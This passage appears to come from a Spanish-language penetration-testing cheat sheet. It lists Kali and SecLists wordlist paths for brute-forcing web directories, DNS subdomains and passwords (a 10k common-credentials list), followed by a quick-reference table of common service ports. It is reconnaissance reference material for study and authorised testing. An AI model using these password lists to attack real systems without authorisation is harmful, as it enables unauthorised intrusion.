/usr/share/wordlists/dirb/big.txt                                   # Directorios web (grande)
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        # Directorios (medio)
/usr/share/seclists/Discovery/Web-Content/common.txt                # Descubrimiento web
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt # 10k contrasenas
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   # Subdominios
```

---

## Referencia rapida de Puertos Comunes

```
21   FTP          22   SSH          23   Telnet       25   SMTP
53   DNS          80   HTTP         110  POP3         111  RPCBind
135  MSRPC        139  NetBIOS      143  IMAP         443  HTTPS
445  SMB          993  IMAPS        995  POP3S        1433 MSSQL
1521 Oracle       2049 NFS          3306 MySQL        3389 RDP
5432 PostgreSQL   5900 VNC          6379 Redis        8080 HTTP-Alt
8443 HTTPS-Alt    8888 HTTP-Alt     9200 Elasticsearch 27017 MongoDB
```
